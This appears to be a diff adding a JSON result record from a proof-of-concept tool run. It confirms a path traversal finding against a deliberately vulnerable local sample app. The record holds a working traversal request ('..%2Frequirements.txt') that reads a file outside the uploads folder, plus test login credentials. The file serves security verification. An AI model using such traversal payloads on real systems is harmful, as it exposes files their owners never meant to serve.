@@ -1,0 +1,71 @@
+{
+  "tool": "run_poc",
+  "version": "1.0.0",
+  "finding": "F-8",
+  "poc_file": "traversal-attachments.json",
+  "target": "http://127.0.0.1:5057",
+  "permission": "Example run: the skill's author started the deliberately vulnerable sample app on 127.0.0.1:5057 for this run and allowed safe PoCs against it",
+  "allow_hosts": [],
+  "started_at": "2026-11-10T04:26:54Z",
+  "finished_at": "2026-11-10T04:26:55Z",
+  "safety": {
+    "checked": true,
+    "issues": []
+  },
+  "steps": [
+    {
+      "name": "login as alice",
+      "request": {
+        "method": "POST",
+        "url": "http://127.0.0.1:5057/login",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "email=alice%40example.test&password=alice-test-pw"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "Server": "Werkzeug/3.0.1 Python/3.12.10",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "205",
+          "Location": "/invoices",
+          "Set-Cookie": "session=<redacted>; HttpOnly; Path=/"
+        },
+        "body_excerpt": "<!doctype html>\n<html lang=en>\n<title>Redirecting...</title>\n<h1>Redirecting...</h1>\n<p>You should be redirected automatically to the target URL: <a href=\"/invoices\">/invoices</a>. If not, click the link.\n",
+        "body_length": 205,
+        "elapsed_ms": 514
+      },
+      "expect_status_met": true
+    },
+    {
+      "name": "read outside uploads",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:5057/attachments?name=..%2Frequirements.txt",
+        "headers": {},
+        "body": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "Werkzeug/3.0.1 Python/3.12.10",
+          "Content-Type": "text/plain; charset=utf-8",
+          "Content-Length": "74"
+        },
+        "body_excerpt": "Flask==3.0.3\nWerkzeug==3.0.1\nJinja2==3.1.2\nrequests==2.31.0\nPyYAML==6.0.1\n",
+        "body_length": 74,
+        "elapsed_ms": 16
+      },
+      "expect_status_met": null
+    }
+  ],
+  "proof": {
+    "type": "marker_in_response",
+    "step": "read outside uploads",
+    "marker": "PyYAML==6.0.1",
+    "passed": true,
+    "observed": "marker found in the response to 'read outside uploads'"
+  },
+  "result": "confirmed"
+}
